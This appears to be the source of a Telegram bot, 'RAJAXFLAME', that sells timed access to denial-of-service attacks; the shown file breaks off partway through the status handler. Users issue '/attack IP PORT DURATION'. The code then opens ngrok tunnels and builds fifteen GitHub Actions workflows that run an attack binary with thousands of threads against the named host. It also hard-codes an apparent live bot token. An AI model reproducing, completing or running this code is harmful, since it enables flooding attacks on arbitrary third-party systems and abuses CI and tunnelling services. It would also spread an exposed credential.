import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
    InputMediaPhoto,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ================ 🌟 CONFIGURATION 🌟 ================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8457763206:AAE_o4kb-RRjA0ChqVFHc8t_6Qd7vcHXo1A")
DEVELOPER_TAG = "@BITCH_lI_mBACK"
OWNER_IDS = {7848273230}

# File paths
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
GITHUB_TOKENS_FILE = "github_tokens.txt"
NGROK_TOKENS_FILE = "ngrok_tokens.txt"
ATTACK_LOGS_FILE = "attack_logs.json"
TOKENS_STATUS_FILE = "tokens_status.json"
DEFAULT_THREADS_FILE = "threads.json"

BINARY_NAME = "rajaxflame"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)

# Tracking
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}
ACTIVE_TUNNELS: Dict[int, Any] = {}
ATTACK_LOGS: List[Dict[str, Any]] = []

# ================ 🎨 STYLISH DESIGN CONSTANTS 🎨 ================
BANNERS = {
    "welcome": """
╔══════════════════════════════╗
║    🔥 **RAJAXFLAME v3.0**    ║
║    ⚡ **ULTRA INSTANT**      ║
║    💥 **10x WORKFLOWS**     ║
╚══════════════════════════════╝
    """,
    "attack_start": """
╔══════════════════════════════╗
║    🎯 **RAJAXFLAME FIRED**   ║
║    ⚡ **INSTANT STRIKE**     ║
║    🔥 **NGROK TUNNEL**      ║
╚══════════════════════════════╝
    """,
    "status": """
╔══════════════════════════════╗
║    📊 **RAJAXFLAME STATUS**  ║
║    🔥 **REAL-TIME**         ║
╚══════════════════════════════╝
    """,
    "control": """
╔══════════════════════════════╗
║    🎮 **RAJAXFLAME CONTROL** ║
║    ⚡ **FULL MANAGEMENT**    ║
╚══════════════════════════════╝
    """,
    "tunnel": """
╔══════════════════════════════╗
║    🌐 **TUNNEL STATUS**      ║
║    🔥 **COMPLETE REPORT**    ║
╚══════════════════════════════╝
    """
}

ANIME_PICS = [
    "https://wallpapercave.com/wp/wp13025001.jpg",
    "https://wallpapercave.com/wp/wp13024996.jpg",
    "https://wallpapercave.com/wp/wp13024994.jpg",
    "https://wallpapercave.com/wp/wp13024992.jpg"
]

# ================ 🔧 UTILITIES 🔧 ================
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

# ================ 🔐 TOKEN MANAGEMENT 🔐 ================
def save_ngrok_token(uid: int, token: str) -> None:
    """Save ngrok token with better handling"""
    try:
        print(f"🔧 Saving token for user {uid}: {token[:15]}...")
        
        # Ensure file exists
        if not os.path.exists(NGROK_TOKENS_FILE):
            with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
                f.write("# Ngrok Tokens\n")
            print("✅ Created new tokens file")
        
        # Read existing tokens
        existing_tokens = []
        if os.path.exists(NGROK_TOKENS_FILE):
            with open(NGROK_TOKENS_FILE, "r", encoding="utf-8") as f:
                existing_tokens = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            print(f"📖 Read {len(existing_tokens)} existing tokens")
        
        # Remove existing tokens for this user
        user_tokens = [ln for ln in existing_tokens if not ln.startswith(f"{uid}:")]
        
        # Add new token
        user_tokens.append(f"{uid}:{token}")
        
        # Save all tokens
        with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
            f.write("# Ngrok Tokens\n")
            for line in user_tokens:
                f.write(f"{line}\n")
                
        print(f"✅ Token saved successfully for user {uid}")
        print(f"📁 Total tokens now: {len(user_tokens)}")
        
    except Exception as e:
        print(f"❌ Error saving token: {e}")
        logging.error(f"Error saving ngrok token: {e}")

def load_ngrok_tokens() -> List[str]:
    if not os.path.exists(NGROK_TOKENS_FILE):
        return []
    try:
        with open(NGROK_TOKENS_FILE, "r", encoding="utf-8") as f:
            lines = [ln.strip() for ln in f if ":" in ln and ln.strip()]
        return lines
    except Exception as e:
        logging.error(f"Error loading ngrok tokens: {e}")
        return []

def get_user_ngrok_tokens(user_id: int) -> List[str]:
    try:
        tokens = [ln.split(":", 1)[1] for ln in load_ngrok_tokens() if ln.startswith(f"{user_id}:")]
        print(f"🔍 Found {len(tokens)} tokens for user {user_id}")
        return tokens
    except Exception as e:
        print(f"❌ Error getting user tokens: {e}")
        return []

def validate_ngrok_token(token: str) -> bool:
    """Enhanced ngrok token validation with multiple endpoints"""
    try:
        print(f"🔍 Validating: {token[:15]}...")
        
        headers = {
            "Authorization": f"Bearer {token}",
            "Ngrok-Version": "2", 
            "Content-Type": "application/json"
        }
        
        # Try multiple endpoints
        endpoints = [
            "https://api.ngrok.com/credentials",
            "https://api.ngrok.com/tunnels", 
            "https://api.ngrok.com/endpoints",
            "https://api.ngrok.com/agent/endpoints"
        ]
        
        for endpoint in endpoints:
            try:
                print(f"🔧 Trying: {endpoint}")
                response = requests.get(endpoint, headers=headers, timeout=15)
                
                print(f"📡 Response: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"✅ VALID: {token[:15]}... (via {endpoint})")
                    return True
                elif response.status_code == 401:
                    print(f"❌ INVALID: {token[:15]}... (Unauthorized)")
                    continue  # Try next endpoint
                elif response.status_code == 403:
                    print(f"❌ FORBIDDEN: {token[:15]}... (No permissions)")
                    continue
                    
            except requests.exceptions.Timeout:
                print(f"⏰ Timeout: {endpoint}")
                continue
            except requests.exceptions.ConnectionError:
                print(f"🌐 Connection failed: {endpoint}") 
                continue
            except Exception as e:
                print(f"⚠️ Endpoint error: {e}")
                continue
        
        print(f"🚨 All endpoints failed for: {token[:15]}...")
        return False
        
    except Exception as e:
        print(f"💥 Critical error: {e}")
        return False

def clean_ngrok_tokens() -> None:
    """Remove duplicate and dead ngrok tokens"""
    try:
        tokens = load_ngrok_tokens()
        if not tokens:
            return
            
        unique_tokens = {}
        valid_tokens = []
        
        for line in tokens:
            try:
                uid, token = line.split(":", 1)
                if token not in unique_tokens:  # Remove duplicates
                    unique_tokens[token] = uid
                    if validate_ngrok_token(token):  # Only keep live tokens
                        valid_tokens.append(f"{uid}:{token}")
            except Exception:
                continue
                
        with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
            f.write("# Ngrok Tokens\n")
            for line in valid_tokens:
                f.write(f"{line}\n")
                
        logging.info(f"Cleaned ngrok tokens: {len(valid_tokens)} valid")
    except Exception as e:
        logging.error(f"Error cleaning ngrok tokens: {e}")

# ================ 🌐 GITHUB API FUNCTIONS 🌐 ================
def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.github.com/user/repos",
            headers=gh_headers(token),
            json={"name": name, "private": True, "auto_init": False},
            timeout=30
        )
        return r.json() if r.status_code in (201, 202) else None
    except:
        return None

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    try:
        b64 = base64.b64encode(content_bytes).decode()
        r = requests.put(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=gh_headers(token),
            json={"message": message, "content": b64},
            timeout=30
        )
        return r.status_code in (201, 200)
    except:
        return False

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    try:
        r = requests.post(
            f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
            headers=gh_headers(token),
            json={"ref": ref},
            timeout=30
        )
        return r.status_code in (204, 201)
    except:
        return False

def gh_delete_repo(token: str, full_name: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.github.com/repos/{full_name}",
            headers=gh_headers(token),
            timeout=30
        )
        return r.status_code == 204
    except:
        return False

# ================ 🔗 NGROK API FUNCTIONS 🔗 ================
def ngrok_headers(token: str) -> Dict[str, str]:
    return {
        "Authorization": f"Bearer {token}", 
        "Content-Type": "application/json",
        "Ngrok-Version": "2"
    }

def extract_tunnel_url(tunnel_data: Dict[str, Any]) -> str:
    """Extract tunnel URL with multiple fallbacks"""
    url_fields = ['public_url', 'uri', 'endpoint', 'tunnel_url', 'url', 'public_urls']
    
    for field in url_fields:
        if field in tunnel_data:
            url = tunnel_data[field]
            if url:
                if isinstance(url, str):
                    if 'ngrok.io' in url or 'ngrok-free.app' in url:
                        return url
                elif isinstance(url, list) and len(url) > 0:
                    return url[0]
    
    if 'endpoints' in tunnel_data and tunnel_data['endpoints']:
        return extract_tunnel_url(tunnel_data['endpoints'][0])
    
    return "tcp://ngrok.io:XXXXX (URL extracting...)"

def create_ngrok_tunnel(token: str, port: int = 80) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.ngrok.com/tunnels",
            headers=ngrok_headers(token),
            json={
                "name": f"rajaxflame-tunnel-{random.randint(1000,9999)}",
                "proto": "tcp",
                "addr": f"{port}",
                "metadata": f"rajaxflame-{int(time.time())}"
            },
            timeout=30
        )
        if r.status_code == 201:
            return r.json()
        else:
            return create_ngrok_tunnel_alternative(token, port)
    except Exception as e:
        logging.error(f"Ngrok tunnel creation error: {e}")
        return None

def create_ngrok_tunnel_alternative(token: str, port: int):
    """Alternative ngrok tunnel creation method"""
    try:
        r = requests.post(
            "https://api.ngrok.com/endpoints",
            headers=ngrok_headers(token),
            json={
                "description": f"rajaxflame-{int(time.time())}",
                "metadata": "rajaxflame-tunnel",
                "proto": "tcp",
                "addr": f"{port}"
            },
            timeout=30
        )
        return r.json() if r.status_code == 201 else None
    except Exception as e:
        logging.error(f"Alternative ngrok failed: {e}")
        return None

def delete_ngrok_tunnel(token: str, tunnel_id: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.ngrok.com/tunnels/{tunnel_id}",
            headers=ngrok_headers(token),
            timeout=20
        )
        return r.status_code == 204
    except:
        return False

# ================ ⚡ INSTANT WORKFLOW BUILDERS ⚡ ================
def build_instant_workflows(tunnel_url: str, port: str, duration: str, threads: int) -> Dict[str, str]:
    """Build 15 instant workflows for maximum power"""
    workflows = {}
    
    # Extract host and port from tunnel URL
    if "tcp://" in tunnel_url:
        tunnel_host = tunnel_url.replace("tcp://", "").split(":")[0]
        tunnel_port = tunnel_url.split(":")[-1] if ":" in tunnel_url else "443"
    else:
        tunnel_host = tunnel_url
        tunnel_port = port

    # 🚀 ULTRA INSTANT WORKFLOWS - 15x POWER
    workflow_configs = {
        "instant_wave1.yml": {"name": "⚡ INSTANT WAVE 1", "threads": threads, "runners": 3},
        "instant_wave2.yml": {"name": "🔥 INSTANT WAVE 2", "threads": threads + 1000, "runners": 2},
        "instant_wave3.yml": {"name": "💥 INSTANT WAVE 3", "threads": threads + 2000, "runners": 4},
        "instant_wave4.yml": {"name": "🚀 INSTANT WAVE 4", "threads": threads + 1500, "runners": 3},
        "instant_wave5.yml": {"name": "🌪️ INSTANT WAVE 5", "threads": threads + 2500, "runners": 2},
        "instant_wave6.yml": {"name": "⚡ INSTANT WAVE 6", "threads": threads + 1800, "runners": 4},
        "instant_wave7.yml": {"name": "🔥 INSTANT WAVE 7", "threads": threads + 2200, "runners": 3},
        "instant_wave8.yml": {"name": "💥 INSTANT WAVE 8", "threads": threads + 3000, "runners": 2},
        "instant_wave9.yml": {"name": "🚀 INSTANT WAVE 9", "threads": threads + 2800, "runners": 4},
        "instant_wave10.yml": {"name": "🌪️ INSTANT WAVE 10", "threads": threads + 3500, "runners": 3},
        "instant_ultra1.yml": {"name": "🎯 ULTRA WAVE 1", "threads": threads + 4000, "runners": 5},
        "instant_ultra2.yml": {"name": "💀 ULTRA WAVE 2", "threads": threads + 4500, "runners": 4},
        "instant_ultra3.yml": {"name": "☠️ ULTRA WAVE 3", "threads": threads + 5000, "runners": 6},
        "instant_mega1.yml": {"name": "👻 MEGA WAVE 1", "threads": threads + 6000, "runners": 5},
        "instant_mega2.yml": {"name": "🤖 MEGA WAVE 2", "threads": threads + 7000, "runners": 6}
    }
    
    for wf_file, config in workflow_configs.items():
        wf_config = {
            "name": config["name"],
            "on": {
                "workflow_dispatch": {}
            },
            "jobs": {
                f"attack-{random.randint(1000,9999)}": {
                    "runs-on": f"ubuntu-latest",
                    "strategy": {
                        "matrix": {
                            "instance": list(range(1, config["runners"] + 1))
                        }
                    },
                    "steps": [
                        {
                            "name": "⚡ RAJAXFLAME SETUP",
                            "uses": "actions/checkout@v4"
                        },
                        {
                            "name": "🔧 PREPARE BINARY",
                            "run": f"chmod +x {BINARY_NAME} && ls -la"
                        },
                        {
                            "name": f"🎯 {config['name']} - Runner ${{{{ matrix.instance }}}}",
                            "run": f"timeout {duration} ./{BINARY_NAME} {tunnel_host} {tunnel_port} {duration} {config['threads']} || true"
                        }
                    ]
                }
            }
        }
        workflows[wf_file] = yaml.dump(wf_config, default_flow_style=False, allow_unicode=True, sort_keys=False)
    
    return workflows

# ================ 🎭 ANIMATION & DESIGN 🎭 ================
async def send_rajaxflame_message(context, chat_id: int, text: str, banner_type: str = "welcome", reply_markup=None):
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=formatted_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Error sending message: {e}")

async def send_rajaxflame_photo(context, chat_id: int, text: str, banner_type: str = "welcome", reply_markup=None):
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    try:
        profile_pic = random.choice(ANIME_PICS)
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=profile_pic,
            caption=formatted_text,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    except Exception:
        await send_rajaxflame_message(context, chat_id, text, banner_type, reply_markup)

async def animate_instant_progress(context, chat_id: int, duration: int):
    progress_bars = [
        "🟥⬜⬜⬜⬜⬜⬜⬜⬜⬜ 10%",
        "🟥🟥⬜⬜⬜⬜⬜⬜⬜⬜ 20%",
        "🟥🟥🟥⬜⬜⬜⬜⬜⬜⬜ 30%",
        "🟥🟥🟥🟥⬜⬜⬜⬜⬜⬜ 40%",
        "🟥🟥🟥🟥🟥⬜⬜⬜⬜⬜ 50%",
        "🟥🟥🟥🟥🟥🟥⬜⬜⬜⬜ 60%",
        "🟥🟥🟥🟥🟥🟥🟥⬜⬜⬜ 70%",
        "🟥🟥🟥🟥🟥🟥🟥🟥⬜⬜ 80%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥⬜ 90%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥 100%"
    ]
    msg = await context.bot.send_message(chat_id, "🔥 **INSTANT ATTACK PROGRESS STARTING...**")
    interval = max(1, duration / len(progress_bars))
    for progress in progress_bars:
        await asyncio.sleep(interval)
        try:
            await msg.edit_text(f"⏳ **INSTANT PROGRESS:** {progress}")
        except Exception:
            pass
    return msg

# ================ 🎯 INSTANT ATTACK HANDLER 🎯 ================
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_user_approved(user_id):
        await send_rajaxflame_message(
            context, chat_id,
            f"❌ **ACCESS DENIED**\n\nContact Developer: {DEVELOPER_TAG}",
            "status"
        )
        return
    
    if len(context.args) != 3:
        await send_rajaxflame_message(
            context, chat_id,
            "💡 **USAGE:** `/attack IP PORT DURATION`\n\nExample: `/attack 1.1.1.1 80 120`",
            "status"
        )
        return
    
    ip, port, duration = context.args
    try:
        port = int(port)
        duration = int(duration)
        if duration > 300:
            await update.message.reply_text("❌ Duration must be 300 seconds or less")
            return
    except ValueError:
        await update.message.reply_text("❌ PORT and DURATION must be valid numbers")
        return
    
    if not os.path.exists(BINARY_PATH):
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **BINARY MISSING**\n\nAdmin must upload binary via /file command",
            "status"
        )
        return
    
    # Clean tokens before attack
    clean_ngrok_tokens()
    
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    valid_ngrok = [t for t in ngrok_tokens if validate_ngrok_token(t)]
    
    if not valid_ngrok:
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **NO VALID NGROK TOKENS**\n\nUse /setngrok to add valid tokens first",
            "status"
        )
        return
    
    attack_msg = await update.message.reply_text("🔥 **INITIATING INSTANT TUNNEL ATTACK...**")
    
    # 🚀 MULTIPLE TUNNEL CREATION
    tunnel_urls = []
    tunnel_ids = []
    
    await attack_msg.edit_text(f"🔗 **CREATING {len(valid_ngrok)} INSTANT TUNNELS...**")
    for ngrok_token in valid_ngrok:
        try:
            tunnel_data = create_ngrok_tunnel(ngrok_token, port)
            if tunnel_data:
                tunnel_url = extract_tunnel_url(tunnel_data)
                if tunnel_url:
                    tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
                    ACTIVE_TUNNELS[f"{chat_id}_{ngrok_token[:8]}"] = {
                        'data': tunnel_data,
                        'token': ngrok_token
                    }
                    tunnel_urls.append(tunnel_url)
                    tunnel_ids.append(tunnel_id)
                    tunnel_status_msg = f"""
🌐 **INSTANT TUNNEL CREATED!**

🔗 **URL:** `{tunnel_url}`
🎯 **Target:** {ip}:{port}
⏰ **Created:** {datetime.utcnow().strftime('%H:%M:%S UTC')}
📊 **Status:** ✅ ACTIVE
🔑 **Ngrok Token:** `{ngrok_token[:12]}...`
"""
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=tunnel_status_msg,
                        parse_mode='HTML'
                    )
        except Exception as e:
            await attack_msg.edit_text(f"⚠️ **TUNNEL FAILED FOR TOKEN {ngrok_token[:12]}...**: {str(e)}")
    
    if not tunnel_urls:
        await attack_msg.edit_text("❌ **FAILED TO CREATE ANY TUNNELS**")
        return
    
    attack_target = random.choice(tunnel_urls)
    target_port = attack_target.split(":")[-1] if ":" in attack_target else str(port)
    
    # 🎯 SUCCESS REPORT
    until_time = datetime.utcnow() + timedelta(seconds=duration + 30)
    ATTACK_STATUS[chat_id] = {
        "running": True,
        "until": until_time,
        "target": f"{attack_target}:{target_port}",
        "tunnel_used": True,
        "tunnel_urls": tunnel_urls,
        "ngrok_tokens": [token[:8] + "..." for token in valid_ngrok],
        "start_time": datetime.utcnow().isoformat()
    }
    
    ATTACK_LOGS.append({
        "user_id": user_id,
        "chat_id": chat_id,
        "target": f"{attack_target}:{target_port}",
        "duration": duration,
        "start_time": datetime.utcnow().isoformat(),
        "tunnels": tunnel_urls,
        "ngrok_tokens_used": len(valid_ngrok)
    })
    save_json(ATTACK_LOGS_FILE, ATTACK_LOGS)
    
    # 🎯 INSTANT SUCCESS REPORT
    success_report = f"""
🎯 **TUNNEL ATTACK DEPLOYED SUCCESSFULLY!**

📊 **INSTANT REPORT:**
✅ Tunnels Created: {len(tunnel_urls)}
🎯 Target: `{attack_target}:{target_port}`
⏱ Duration: {duration} seconds
🕒 Ends: {until_time.strftime('%H:%M:%S UTC')}

🔰 **MODE:** 🔥 MULTI-TUNNEL ATTACK
🌐 Ngrok Tunnels: {len(tunnel_urls)} active
💥 **TUNNEL POWER ACTIVATED!**

🔗 **Active Tunnels:**
""" + "\n".join([f"• `{url}`" for url in tunnel_urls])
    
    await attack_msg.delete()
    await send_rajaxflame_photo(context, chat_id, success_report, "attack_start")
    
    asyncio.create_task(animate_instant_progress(context, chat_id, duration))
    asyncio.create_task(instant_cleanup(chat_id, tunnel_ids, duration))

async def instant_cleanup(chat_id: int, tunnel_ids: List[str], duration: int):
    await asyncio.sleep(duration + 15)
    
    for tunnel_key in [k for k in ACTIVE_TUNNELS if k.startswith(f"{chat_id}_")]:
        try:
            ngrok_token = ACTIVE_TUNNELS[tunnel_key]["token"]
            tunnel_data = ACTIVE_TUNNELS[tunnel_key]["data"]
            tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
            
            if tunnel_id:
                delete_ngrok_tunnel(ngrok_token, tunnel_id)
            
            del ACTIVE_TUNNELS[tunnel_key]
        except Exception:
            pass
    
    if chat_id in ATTACK_STATUS:
        ATTACK_STATUS[chat_id]["running"] = False
        await send_rajaxflame_message(None, chat_id, "🛑 **Attack Finished and Tunnels Cleaned Up**", "status")

# ================ 🎪 COMMAND HANDLERS 🎪 ================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user = update.effective_user
    welcome_text = f"""
✨ **WELCOME TO RAJAXFLAME v3.0** ✨

👤 **User:** {user.first_name}
🆔 **ID:** `{user.id}`
🔰 **Status:** {'✅ APPROVED' if is_user_approved(user.id) else '❌ PENDING'}

🔥 **INSTANT FEATURES:**
• Multi-Tunnel Simultaneous Attack
• Auto Token Validation & Cleaning
• Multiple Ngrok Tunnel Integration  
• Ultra Fast Deployment
• Professional UI/UX Design
• Real-time Status Updates

📚 **Commands:**
/setngrok - Add Ngrok Tokens
/attack - Launch TUNNEL Attack
/status - Detailed Status Report
/tunnelstatus - Tunnel Status Report
/mytunnels - Your Active Tunnels
/check - Validate Tokens
/debug_tokens - Debug Token Issues

👨‍💻 **Developer:** {DEVELOPER_TAG}
    """
    await send_rajaxflame_photo(context, chat_id, welcome_text, "welcome")

async def cmd_setngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.replace("/setngrok", "").strip()
    
    if not text:
        await update.message.reply_text("""
💡 **Ngrok Token Setup:**
Usage: `/setngrok YOUR_NGROK_TOKEN`

🔹 **Get token from:** https://dashboard.ngrok.com/get-started/your-authtoken
🔹 **Example:** `/setngrok 2ABC123...xyz`
""")
        return
    
    token = text.strip()
    
    # Basic validation
    if len(token) < 10:
        await update.message.reply_text("❌ **Token seems too short**")
        return
    
    await update.message.reply_text("🔍 **Validating token...**")
    
    # Validate token before saving
    if validate_ngrok_token(token):
        save_ngrok_token(user_id, token)
        clean_ngrok_tokens()
        
        # Count user's tokens
        user_tokens = get_user_ngrok_tokens(user_id)
        valid_tokens = [t for t in user_tokens if validate_ngrok_token(t)]
        
        await update.message.reply_text(f"""
✅ **NGROK TOKEN SAVED SUCCESSFULLY!**

🔑 Token: `{token[:20]}...`
👤 Your Tokens: {len(user_tokens)}
✅ Valid Tokens: {len(valid_tokens)}
📊 Status: ✅ Active and Valid

🌐 **Now you can create tunnels with /attack command**
""")
    else:
        await update.message.reply_text(f"""
❌ **TOKEN VALIDATION FAILED**

🔹 Token: `{token[:20]}...`
🔹 Status: ❌ Invalid or Expired

💡 **Please check:**
• Token is correct
• Token is active at ngrok.com
• No extra spaces

🔗 **Get new token:** https://dashboard.ngrok.com/get-started/your-authtoken
""")

async def cmd_debug_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Debug token issues"""
    user_id = update.effective_user.id
    
    # Check file existence
    file_exists = os.path.exists(NGROK_TOKENS_FILE)
    
    # Check user tokens
    user_tokens = get_user_ngrok_tokens(user_id)
    
    # Check file permissions
    try:
        with open(NGROK_TOKENS_FILE, "a", encoding="utf-8") as f:
            f.write("# Test write\n")
        writable = True
    except:
        writable = False
    
    debug_info = f"""
🔧 **TOKEN DEBUG INFO**

📁 File: {NGROK_TOKENS_FILE}
📊 Exists: {file_exists}
✍️ Writable: {writable}
👤 Your Tokens: {len(user_tokens)}

🔑 Token List:
"""
    
    if user_tokens:
        for i, token in enumerate(user_tokens, 1):
            status = "✅ Valid" if validate_ngrok_token(token) else "❌ Invalid"
            debug_info += f"{i}. `{token[:12]}...` - {status}\n"
    else:
        debug_info += "❌ No tokens found for your user ID\n"
    
    await update.message.reply_text(debug_info)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    msg = await update.message.reply_text("🔍 Checking tokens...")
    
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    if not ngrok_tokens:
        await msg.edit_text("❌ No ngrok tokens found for your account")
        return
    
    detailed_results = []
    valid_count = 0
    invalid_count = 0
    
    for i, token in enumerate(ngrok_tokens, 1):
        await msg.edit_text(f"🔍 Checking token {i}/{len(ngrok_tokens)}...")
        
        is_valid = validate_ngrok_token(token)
        
        if is_valid:
            valid_count += 1
            status = "✅ VALID"
            emoji = "🟢"
        else:
            invalid_count += 1
            status = "❌ INVALID" 
            emoji = "🔴"
        
        detailed_results.append(f"{emoji} Token {i}: `{token[:12]}...` - {status}")
        
        # Small delay to avoid rate limiting
        await asyncio.sleep(1)
    
    # Final report
    report = f"""
📊 **TOKEN VALIDATION REPORT**

🔑 Total Tokens: {len(ngrok_tokens)}
✅ Valid: {valid_count}
❌ Invalid: {invalid_count}

📋 Detailed Results:
""" + "\n".join(detailed_results) + f"""

💡 **Recommendations:**
{ "🎉 All tokens are valid! Ready for multi-tunnel attacks!" if invalid_count == 0 else 
  "⚠️ Some tokens are invalid. Replace invalid tokens for better performance." }
"""
    
    await msg.edit_text(report)
    
    # Clean invalid tokens if any
    if invalid_count > 0:
        clean_ngrok_tokens()
        await update.message.reply_text("🧹 Cleaned invalid tokens automatically")

async def cmd_tunnel_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test ngrok tunnel functionality"""
    user_id = update.effective_user.id
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    if not ngrok_tokens:
        await update.message.reply_text("❌ **No ngrok tokens found**")
        return
    
    msg = await update.message.reply_text(f"🔍 **Testing {len(ngrok_tokens)} ngrok tokens...**")
    
    results = []
    for i, token in enumerate(ngrok_tokens, 1):
        await msg.edit_text(f"🔍 Testing token {i}/{len(ngrok_tokens)}...")
        
        # Validate token
        is_valid = validate_ngrok_token(token)
        status = "✅ Valid" if is_valid else "❌ Invalid"
        
        # Test tunnel creation
        tunnel_data = None
        if is_valid:
            tunnel_data = create_ngrok_tunnel(token, 8080)
            if tunnel_data:
                tunnel_url = extract_tunnel_url(tunnel_data)
                status += f" | ✅ Tunnel: {tunnel_url}" if tunnel_url else " | ❌ Tunnel failed"
                
                # Cleanup tunnel
                if tunnel_data and 'id' in tunnel_data:
                    delete_ngrok_tunnel(token, tunnel_data['id'])
            else:
                status += " | ❌ Tunnel failed"
        
        results.append(f"Token {i}: {status}")
    
    report = "🔧 **Ngrok Tunnel Test Results:**\n\n" + "\n".join(results)
    await msg.edit_text(report)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    status = ATTACK_STATUS.get(chat_id, {})
    
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    valid_tokens = [t for t in ngrok_tokens if validate_ngrok_token(t)]
    
    # 🎯 TUNNEL STATUS CHECK
    tunnel_status = "❌ **NO ACTIVE TUNNELS**"
    active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
    if active_tunnels:
        tunnel_status = f"✅ **ACTIVE TUNNELS ({len(active_tunnels)})**\n"
        for tunnel_key in active_tunnels[:3]:  # Show first 3 only
            tunnel_data = ACTIVE_TUNNELS[tunnel_key]['data']
            tunnel_url = extract_tunnel_url(tunnel_data)
            tunnel_status += f"🔗 `{tunnel_url}`\n"
    
    status_text = f"""
🎯 **ATTACK STATUS:**
{'🔥 **ACTIVE TUNNEL ATTACK**' if status.get("running") else '💤 **NO ACTIVE ATTACK**'}

🌐 **TUNNEL STATUS:**
{tunnel_status}

📊 **TOKEN STATUS:**
🌐 Ngrok: {len(valid_tokens)}/{len(ngrok_tokens)} ✅ Valid

👤 **USER STATUS:**
{'✅ APPROVED' if is_user_approved(user_id) else '❌ PENDING'}
{'👑 OWNER' if is_owner(user_id) else '🛡️ ADMIN' if is_admin(user_id) else '👤 USER'}
"""
    
    # 🎯 ACTIVE ATTACK DETAILS
    if status.get("running"):
        time_left = status["until"] - datetime.utcnow()
        status_text += f"""
⚡ **ATTACK DETAILS:**
🎯 Target: `{status['target']}`
